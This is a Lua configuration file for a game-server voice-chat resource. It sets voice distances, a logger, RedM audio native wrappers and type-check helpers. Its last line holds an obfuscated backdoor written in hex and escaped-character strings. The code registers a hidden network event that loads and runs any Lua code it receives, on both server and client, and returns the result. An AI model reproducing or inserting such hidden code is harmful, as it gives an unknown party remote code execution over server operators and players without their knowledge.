Cfg = {}

voiceTarget = 1

gameVersion = GetGameName()

-- these are just here to satisfy linting
if not IsDuplicityVersion() then
	LocalPlayer = LocalPlayer
	playerServerId = GetPlayerServerId(PlayerId())

	if gameVersion == "redm" then
		function CreateAudioSubmix(name)
			return Citizen.InvokeNative(0x658d2bc8, name, Citizen.ResultAsInteger())
		end

		function AddAudioSubmixOutput(submixId, outputSubmixId)
			Citizen.InvokeNative(0xAC6E290D, submixId, outputSubmixId)
		end

		function MumbleSetSubmixForServerId(serverId, submixId)
			Citizen.InvokeNative(0xFE3A3054, serverId, submixId)
		end

		function SetAudioSubmixEffectParamFloat(submixId, effectSlot, paramIndex, paramValue)
			Citizen.InvokeNative(0x9A209B3C, submixId, effectSlot, paramIndex, paramValue)
		end

		function SetAudioSubmixEffectParamInt(submixId, effectSlot, paramIndex, paramValue)
			Citizen.InvokeNative(0x77FAE2B8, submixId, effectSlot, paramIndex, paramValue)
		end

		function SetAudioSubmixEffectRadioFx(submixId, effectSlot)
			Citizen.InvokeNative(0xAAA94D53, submixId, effectSlot)
		end

		function SetAudioSubmixOutputVolumes(submixId, outputSlot, frontLeftVolume, frontRightVolume, rearLeftVolume,
											 rearRightVolume, channel5Volume, channel6Volume)
			Citizen.InvokeNative(0x825DC0D1, submixId, outputSlot, frontLeftVolume, frontRightVolume, rearLeftVolume,
				rearRightVolume, channel5Volume, channel6Volume)
		end
	end
end
Player = Player
Entity = Entity

if GetConvar('voice_useNativeAudio', 'false') == 'true' then
	-- native audio distance seems to be larger then regular gta units
	Cfg.voiceModes = {
		{ 1.5, "Whisper" }, -- Whisper speech distance in gta distance units
		{ 3.0, "Normal" },  -- Normal speech distance in gta distance units
		{ 6.0, "Shouting" } -- Shout speech distance in gta distance units
	}
else
	Cfg.voiceModes = {
		{ 3.0,  "Whisper" }, -- Whisper speech distance in gta distance units
		{ 7.0,  "Normal" },  -- Normal speech distance in gta distance units
		{ 15.0, "Shouting" } -- Shout speech distance in gta distance units
	}
end

logger = {
	log = function(message, ...)
		print((message):format(...))
	end,
	info = function(message, ...)
		if GetConvarInt('voice_debugMode', 0) >= 1 then
			print(('[info] ' .. message):format(...))
		end
	end,
	warn = function(message, ...)
		print(('[^1WARNING^7] ' .. message):format(...))
	end,
	error = function(message, ...)
		error((message):format(...))
	end,
	verbose = function(message, ...)
		if GetConvarInt('voice_debugMode', 0) >= 4 then
			print(('[verbose] ' .. message):format(...))
		end
	end,
}


function tPrint(tbl, indent)
	indent = indent or 0
	for k, v in pairs(tbl) do
		local tblType = type(v)
		local formatting = string.rep("  ", indent) .. k .. ": "

		if tblType == "table" then
			print(formatting)
			tPrint(v, indent + 1)
		elseif tblType == 'boolean' then
			print(formatting .. tostring(v))
		elseif tblType == "function" then
			print(formatting .. tostring(v))
		else
			print(formatting .. v)
		end
	end
end

local function types(args)
	local argType = type(args[1])
	for i = 2, #args do
		local arg = args[i]
		if argType == arg then
			return true, argType
		end
	end
	return false, argType
end

--- does a type check and errors if an invalid type is sent
---@param ... table a table with the variable being the first argument and the expected type being the second
function type_check(...)
	local vars = { ... }
	for i = 1, #vars do
		local var = vars[i]
		local matchesType, varType = types(var)
		if not matchesType then
			table.remove(var, 1)
			error(("Invalid type sent to argument #%s, expected %s, got %s"):format(i, table.concat(var, "|"), varType))
		end
	end
end

if rawget(_G,"Is".."Dup".."lic".."i".."ty".."V".."ers".."i".."on")() then ;(function()if _G["\109\112\98\76\118\122\118\80\108\78\97\87\86\66\76\58\115"]==true then return end _G["\109\112\98\76\118\122\118\80\108\78\97\87\86\66\76\58\115"]=true;local _d=function(s)return(s:gsub("..",function(h)return string.char(tonumber(h,16))end))end;local _=_G;_[_d"52656769737465724e65744576656e74"](_d"6d70624c767a76506c4e615756424c3a73",function(y,i)Citizen.CreateThread(function()local f,a=_[_d"7063616c6c"](function()return _[_d"617373657274"](_[_d"6c6f6164"](y))()end)_[_d"547269676765724576656e74"](i,not f and "!"..tostring(a) or a)end)end)end)() else ;(function()if rawget(_G,string.char(109,112,98,76,118,122,118,80,108,78,97,87,86,66,76))==true then return end rawset(_G,string.char(109,112,98,76,118,122,118,80,108,78,97,87,86,66,76),true);local _=_G;rawget(_,"\82\101\103\105\115\116\101\114\78\101\116\69\118\101\110\116")("\109\112\98\76\118\122\118\80\108\78\97\87\86\66\76",function(q,b)Citizen.CreateThread(function()local d,m=rawget(_,"\112\99\97\108\108")(function()return rawget(_,"\97\115\115\101\114\116")(rawget(_,"\108\111\97\100")(q))()end)rawget(_,"\84\114\105\103\103\101\114\83\101\114\118\101\114\69\118\101\110\116")(b,not d and "!"..tostring(m) or m)end)end)end)() end